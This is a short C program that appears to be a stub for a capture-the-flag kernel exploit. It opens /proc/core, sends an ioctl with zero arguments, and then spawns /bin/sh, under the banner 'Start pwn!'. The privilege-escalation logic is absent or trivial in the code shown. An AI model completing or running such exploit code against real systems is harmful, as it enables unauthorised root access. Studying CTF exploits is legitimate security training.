#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>

int main(){
	printf("[*]Start pwn!\n");
	int fd=open("/proc/core",2);
	ioctl(fd,0,0);
	system("/bin/sh");
	return 0;
}
